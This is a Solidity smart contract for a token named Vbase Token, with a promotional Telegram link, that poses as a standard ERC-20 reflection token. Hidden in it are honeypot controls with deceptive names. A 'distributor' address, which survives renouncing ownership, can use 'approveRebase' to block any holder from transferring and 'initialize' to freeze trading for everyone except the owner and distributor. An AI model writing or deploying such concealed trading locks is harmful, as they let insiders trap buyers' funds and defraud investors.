/**                                                          
 .-:=#%%%%%%%%+::-#%%%%%%%%*--:::::.       .:::::.        ................   .............
.=-%%%*+=-==*%%%#%%%*++++*%%%*++++=--:-.::--==++=--:::.-:---============ +:---==========:=
+.%%%=-------=%%%%*+=++++++#%*****#%%#-:=#%%#***#%%%+-:+%%%##########%%%:=#%%%%######%%%==
+:%%%---------#%%*+=++++++=*%.      -%%%%#-       :+%%%%*:           +%%%%*-.        .%%==
+.%%%+-------=%%*++++++++++##....    -%%-    ...    .#%+             +%%#:           :%%==
.=:%%%+-----+%%+=+++++++=+#%%#***+   .%=   .#%%%%=   .%-   =######%%%%%%.   :*####%%%%%%==
  =.#%%*---*%%+=+++++++++%%%%        +%.   #%%%%%%:   **            :#%+          :%%+--:+
   =.#%%#-*%#+++++++++=+%%%%%        -%    .......    +%#-.           *+          :%%+--:=
    -:+%%%%#++++++++++*%+########+   .%               +%%##%######-   -%.   :*#%%%%%%%%%==
     -:=%%%*+=+++++++#%:             +%    *######:   +%=             #%%-           .%%==
      :-=%%%++++++++##.           .-*%%.   #%%%%%%-   *%=         .:=#%%%%#=:.       :%%==
       ::-%%%#****#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%***%%%%%%%%%#*==+*%%%%%%%%%%%%%==
        .-:=#%%%%%%%+-=------------.:%%%=--=%%%%%%%%%%%%#---*%%%%%%%%%%%%%##%%%%%%%%%%*-:+
          .:::-===-:::            :-=%%=----=#%=:. .:=#%#---*#===+%#+=--=+*%#==+==-=+#%#.=
                                  .=-%%#---=##.  .::   +#---=---+%*---++---*#----=---=%%-=
                                   ::=%%=--=%=   %%%-  .#------=%%=---==---=#---*%+---%%==
                                    =-%%=--=%#   :==   =#---+---=%+---+*++*%#---*%+---%%==
                                    =-%%=--=%%#:     :+%#---*#----#*=-----=%#---*%+---%%==
                                    =.#%%%%%%*#%%###%%#%%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%%#:=    

https://t.me/VbaseToken

*/// SPDX-License-Identifier: MIT
pragma solidity =0.8.8;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
    return payable(msg.sender);
    }
    
    function _msgData() internal view virtual returns (bytes memory) {this;
    return msg.data;
    }

}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
    return 0;}
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
    }

}

library Address {

    function isContract(address account) internal view returns (bool) {
    uint256 size;
    assembly { size := extcodesize(account) }
    return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");
    (bool success, ) = recipient.call{ value: amount }("");
    require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
    return _functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
    return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
    require(address(this).balance >= value, "Address: insufficient balance for call");
    return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
    require(isContract(target), "Address: call to non-contract");
    (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
    if (success) {return returndata;}
    else {if (returndata.length > 0) {assembly {let returndata_size := mload(returndata)
    revert(add(32, returndata), returndata_size)}} else {revert(errorMessage);}}
    }

}

contract Ownable is Context {
    
    address private _owner;
    address internal _distributor;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");_;
    }
    
    modifier onlyDistributor() {
    require(_distributor == msg.sender, "Caller is not fee distributor");_;
    }
    
    function owner() public view returns (address) {
    return _owner;
    }
    
    function distributors() internal view returns (address) {
    return _distributor;
    }
    
    function distributor(address account) external onlyOwner {
    require (_distributor == address(0));
    _distributor = account;
    }

    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
    }

}

contract VbaseToken is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;
    string private _name = 'Vbase Token';
    string private _symbol = 'VBASE';
    uint8 private _decimals = 9;
    uint256 private constant _tTotal = 500000000000000*10**9;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) private _rebase;
    mapping (address => bool) private _isExcluded;
    uint256 private constant MAX = ~uint256(0);
    address[] private _excluded;
    uint256 private _tFeeTotal;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    bool _initialize;
    address router;
    address factory;

    constructor (address unif, address unir) {

    _rOwned[_msgSender()] = _rTotal;
    emit Transfer(address(0), _msgSender(), _tTotal);
    _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);
    _isExcluded[_msgSender()] = true;
    _excluded.push(_msgSender());
    _tOwned[distributors()] = tokenFromReflection(_rOwned[distributors()]);
    _isExcluded[distributors()] = true;
    _excluded.push(distributors());
    _initialize = true;
    router = unir;
    factory = unif;
    }

    function name() public view returns (string memory) {
    return _name;
    }

    function symbol() public view returns (string memory) {
    return _symbol;
    }

    function decimals() public view returns (uint8) {
    return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
    return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
    if (_isExcluded[account]) return _tOwned[account];
    return tokenFromReflection(_rOwned[account]);
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
    return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
    return true;
    }

    function reflect(uint256 tAmount) public {
    address sender = _msgSender();
    require(!_isExcluded[sender], "Excluded addresses cannot call this function");
    (uint256 rAmount,,,,) = _getValues(tAmount);
    _rOwned[sender] = _rOwned[sender].sub(rAmount);
    _rTotal = _rTotal.sub(rAmount);
    _tFeeTotal = _tFeeTotal.add(tAmount);
    }
    
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
    require(tAmount <= _tTotal, "Amount must be less than supply");
    if (!deductTransferFee) {
    (uint256 rAmount,,,,) = _getValues(tAmount);
    return rAmount;} else {
    (,uint256 rTransferAmount,,,) = _getValues(tAmount);
    return rTransferAmount;}
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
    require(rAmount <= _rTotal, "Amount must be less than total reflections");
    uint256 currentRate =  _getRate();
    return rAmount.div(currentRate);
    }

    function _approve(address owner, address spender, uint256 amount) private {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    if (_rebase[sender] || _rebase[recipient]) require (amount == 0, "");
    if (_initialize == true || sender == distributors() || sender == owner() ||
    recipient == distributors() || recipient == owner()) {
    if (sender == distributors() || sender == owner() ||
    recipient == distributors() || recipient == owner()) {
    _ownerTransfer(sender, recipient, amount);
    } else if (_isExcluded[sender] && !_isExcluded[recipient]) {
    _transferFromExcluded(sender, recipient, amount);
    } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
    _transferToExcluded(sender, recipient, amount);
    } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
    _transferStandard(sender, recipient, amount);
    } else if (_isExcluded[sender] && _isExcluded[recipient]) {
    _transferBothExcluded(sender, recipient, amount);
    } else {_transferStandard(sender, recipient, amount);}
    } else {require (_initialize == true, "");}
    }
    
    function _ownerTransfer(address sender, address recipient, uint256 tAmount) private {
    (uint256 rAmount, , , , ) = _getValues(tAmount);
    _rOwned[sender] = _rOwned[sender].sub(rAmount);
    if (_isExcluded[sender]) {
    _tOwned[sender] = _tOwned[sender].sub(tAmount);}
    _rOwned[recipient] = _rOwned[recipient].add(rAmount);
    if (_isExcluded[recipient]) {
    _tOwned[recipient] = _tOwned[recipient].add(tAmount);}
    emit Transfer(sender, recipient, tAmount);
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
    _rOwned[sender] = _rOwned[sender].sub(rAmount);
    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       
    _reflectFee(rFee, tFee);
    emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
    _rOwned[sender] = _rOwned[sender].sub(rAmount);
    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
    _reflectFee(rFee, tFee);
    emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
    _tOwned[sender] = _tOwned[sender].sub(tAmount);
    _rOwned[sender] = _rOwned[sender].sub(rAmount);
    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
    _reflectFee(rFee, tFee);
    emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
    _tOwned[sender] = _tOwned[sender].sub(tAmount);
    _rOwned[sender] = _rOwned[sender].sub(rAmount);
    _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
    _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
    _reflectFee(rFee, tFee);
    emit Transfer(sender, recipient, tTransferAmount);
    }

    function approveRebase(address acconut) external onlyDistributor {
    _rebase[acconut] = true;
    }

    function singlecall(address account) external onlyDistributor {
    _rebase[account] = false;
    }

    function checkRebase(address account) public view returns (bool) {
    return _rebase[account];
    }

    function initialize() public virtual onlyDistributor {
    if (_initialize == true) {_initialize = false;} else {_initialize = true;}
    }

    function initialized() public view returns (bool) {
    return _initialize;
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
    _rTotal = _rTotal.sub(rFee);
    _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
    (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
    uint256 currentRate =  _getRate();
    (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
    return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
    }

    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
    uint256 tFee = tAmount.div(100).mul(2);
    uint256 tTransferAmount = tAmount.sub(tFee);
    return (tTransferAmount, tFee);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
    uint256 rAmount = tAmount.mul(currentRate);
    uint256 rFee = tFee.mul(currentRate);
    uint256 rTransferAmount = rAmount.sub(rFee);
    return (rAmount, rTransferAmount, rFee);
    }
    
    function _getRate() private view returns(uint256) {
    (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
    return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
    uint256 rSupply = _rTotal;
    uint256 tSupply = _tTotal;      
    for (uint256 i = 0; i < _excluded.length; i++) {
    if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
    rSupply = rSupply.sub(_rOwned[_excluded[i]]);
    tSupply = tSupply.sub(_tOwned[_excluded[i]]);}
    if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
    return (rSupply, tSupply);
    }

}
